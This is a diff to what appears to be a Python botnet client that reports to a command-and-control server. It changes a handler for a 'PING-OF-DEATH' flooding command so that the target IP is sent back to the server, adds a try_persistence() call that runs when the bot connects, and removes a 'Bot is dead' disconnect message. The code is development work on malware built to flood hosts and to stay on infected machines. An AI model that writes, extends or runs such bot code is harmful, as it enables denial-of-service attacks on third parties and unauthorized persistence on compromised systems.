@@ -123,15 +123,15 @@ def handle_ping(ping):
                 continue
             if f'Reply from {ip_address}: bytes=65500 time<1ms TTL=128' in line:
                 output = "PING-OF-DEATH Command Executed Successfully"
-                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
+                client.emit('ping_output', {'idNumber': idNumber, 'target': ip_address, 'output': output})
                 break
             elif f'Reply from {ip_address}: Destination host unreachable.' in line:
                 output = "ERROR : Destination host unreachable."
-                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
+                client.emit('ping_output', {'idNumber': idNumber, 'target': ip_address, 'output': output})
                 break
             elif f'Unknown host' in line:
                 output = "ERROR : Unknown host."
-                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
+                client.emit('ping_output', {'idNumber': idNumber, 'target': ip_address, 'output': output})
                 break
     except Exception as e:
         error_message = str(e)
@@ -261,11 +261,11 @@ def connect():
     info['sid'] = client.sid
     client.emit('Initial_Information', info)
     print('CLIENT SUCCESSFULLY CONNECTIED TO THE SERVER ✅')
+    try_persistence()
 
 @client.event
 def disconnect():
     print('CLIENT PAINFULLY DISCONNECTED FROM THE SERVER ❌')
-    client.emit('message', {'COMMAND': 'OUTPUT', 'idNumber': info['idNumber'], 'command': 'status update', 'result': 'Bot is dead'})
 
 print(f"CONNECTING TO THE SERVER {server_ip}:{server_port} ⏳ ")
 client.connect(f'http://{server_ip}:{server_port}')
